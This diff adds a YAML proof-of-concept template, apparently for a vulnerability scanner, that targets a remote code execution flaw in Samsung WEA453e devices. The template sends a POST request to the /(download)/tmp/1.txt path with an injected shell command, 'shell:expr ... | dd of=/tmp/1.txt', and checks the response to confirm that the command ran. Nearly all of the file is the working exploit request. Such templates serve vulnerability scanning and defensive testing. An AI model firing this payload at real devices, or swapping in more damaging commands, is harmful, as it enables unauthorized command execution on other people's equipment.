@@ -1,0 +1,23 @@
+id: poc-yaml-samsung-wea453e-rce
+info:
+  name: Samsung Wea453e 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: WEA453e
+  reference: []
+  description: null
+variables:
+  r1: random_int(40000, 44800)
+  r2: random_int(1140, 9144)
+transport: http
+requests:
+- method: POST
+  path: /(download)/tmp/1.txt
+  headers: {}
+  data: command1=shell%3Aexpr {{.r1}} - {{.r2}}|dd of=/tmp/1.txt
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 - r2) && !contains(body, "<")
+  output: []
